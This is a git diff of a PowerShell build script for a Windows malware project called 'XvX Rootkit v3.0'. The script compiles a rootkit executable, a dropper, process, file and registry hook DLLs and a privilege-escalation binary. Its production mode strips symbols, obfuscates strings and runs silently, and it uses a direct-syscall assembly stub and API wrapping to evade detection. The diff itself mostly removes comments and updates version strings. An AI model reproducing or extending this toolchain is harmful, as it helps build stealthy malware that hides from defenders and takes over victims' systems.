@@ -1,4 +1,4 @@
-# XvX Rootkit v3.0 - Complete Build Script (OPTIMIZED)
+# XvX Rootkit v3.0 - Complete Build Script
 # Compiles all components: rootkit, dropper, hook DLLs, and PrivEsc binary
 # 
 # OPTIMIZATIONS APPLIED:
@@ -22,7 +22,7 @@ param(
 $ErrorActionPreference = "Stop"
 
 Write-Host "`n========================================" -ForegroundColor Cyan
-Write-Host "  XvX Rootkit v2.0 - COMPLETE BUILD" -ForegroundColor Cyan
+Write-Host "  XvX Rootkit v3.0 - COMPLETE BUILD" -ForegroundColor Cyan
 if ($Debug) {
     Write-Host "  MODE: DEBUG (Console + Logs)" -ForegroundColor Yellow
 } else {
@@ -33,7 +33,6 @@ Write-Host "========================================`n" -ForegroundColor Cyan
 $RootDir = $PSScriptRoot
 $deployDir = Join-Path $RootDir "deploy_package"
 
-# Create deploy directory
 if (-not (Test-Path $deployDir)) { 
     New-Item -ItemType Directory -Path $deployDir | Out-Null
     Write-Host "[+] Created deploy_package directory" -ForegroundColor Green
@@ -47,7 +46,6 @@ Write-Host "`n========================================" -ForegroundColor Cyan
 Write-Host "  COMPILING HOOK DLLS" -ForegroundColor Cyan
 Write-Host "========================================`n" -ForegroundColor Cyan
 
-# Common flags for DLL compilation
 $DLL_FLAGS = @(
     "-shared",
     "-O2",
@@ -59,7 +57,6 @@ $DLL_FLAGS = @(
     "-I$RootDir\V1\include"
 )
 
-# Compile processHooks.dll
 Write-Host "[*] Compiling processHooks.dll..." -ForegroundColor Yellow
 $processHooksSrc = Join-Path $RootDir "hooks\processHooks\dllmain.cpp"
 if (Test-Path $processHooksSrc) {
@@ -79,7 +76,6 @@ if (Test-Path $processHooksSrc) {
     Write-Host "  [!] processHooks source not found" -ForegroundColor Yellow
 }
 
-# Compile fileHooks.dll
 Write-Host "`n[*] Compiling fileHooks.dll..." -ForegroundColor Yellow
 $fileHooksSrc = Join-Path $RootDir "hooks\fileHooks\dllmain.cpp"
 if (Test-Path $fileHooksSrc) {
@@ -99,7 +95,6 @@ if (Test-Path $fileHooksSrc) {
     Write-Host "  [!] fileHooks source not found" -ForegroundColor Yellow
 }
 
-# Compile registryHooks.dll
 Write-Host "`n[*] Compiling registryHooks.dll..." -ForegroundColor Yellow
 $registryHooksSrc = Join-Path $RootDir "hooks\registryHooks\dllmain.cpp"
 if (Test-Path $registryHooksSrc) {
@@ -155,7 +150,6 @@ Write-Host "========================================`n" -ForegroundColor Cyan
 
 Push-Location "$RootDir\src"
 try {
-    # First assemble the DoSyscall stub
     Write-Host "[*] Assembling dosyscall.S..." -ForegroundColor Yellow
     $asmOutput = & gcc -c dosyscall.S -o dosyscall.o 2>&1
     if ($LASTEXITCODE -ne 0) {
@@ -166,7 +160,6 @@ try {
     }
     Write-Host "  [+] dosyscall.o assembled" -ForegroundColor Green
     
-    # Prepare compiler flags based on build mode
     $CFLAGS = @(
         "-std=c++17",
         "-static",
@@ -203,11 +196,10 @@ try {
             "-fno-threadsafe-statics",
             "-s"                  # Strip symbols
         )
-        $LINKER_FLAGS += "-Wl,--gc-sections"  # Remove unused sections
+        $LINKER_FLAGS += "-Wl,--gc-sections"
         Write-Host "  [i] Production mode: Silent execution, size optimized, strings obfuscated" -ForegroundColor Green
     }
     
-    # Combine compiler and optimization flags (NOT linker libs - those go at the end)
     $COMPILE_FLAGS = $CFLAGS + $OPTIMIZATION_FLAGS + @(
         "-Wl,--allow-multiple-definition",
         "-Wl,--wrap,GetThreadContext",
@@ -228,8 +220,6 @@ try {
     }
     
     Write-Host "`n[*] Compiling r00tkit.exe (main rootkit binary)..." -ForegroundColor Yellow
-    # GCC requires libraries AFTER object files for proper symbol resolution
-    # NOTE: UACBypass.cpp moved to POCs/ (not used in main rootkit)
     
     $resourceFlag = if ($resourceObj -and (Test-Path $resourceObj)) { $resourceObj } else { $null }
     
@@ -271,7 +261,6 @@ try {
             Write-Host "      - Strings: Custom crypto (AES-inspired, compile-time)" -ForegroundColor Gray
         }
         
-        # Copy to deploy_package with retry for file lock issues
         $copyAttempts = 0
         $maxAttempts = 3
         $copied = $false
@@ -378,7 +367,6 @@ Write-Host "`n========================================" -ForegroundColor Cyan
 Write-Host "Build Status: $successCount/$requiredCount required components successful" -ForegroundColor $(if ($successCount -eq $requiredCount) { "Green" } else { "Yellow" })
 Write-Host "========================================`n" -ForegroundColor Cyan
 
-# Display build summary
 if (-not $Debug) {
     Write-Host "Production Build Summary:" -ForegroundColor Green
     Write-Host "------------------------" -ForegroundColor Gray
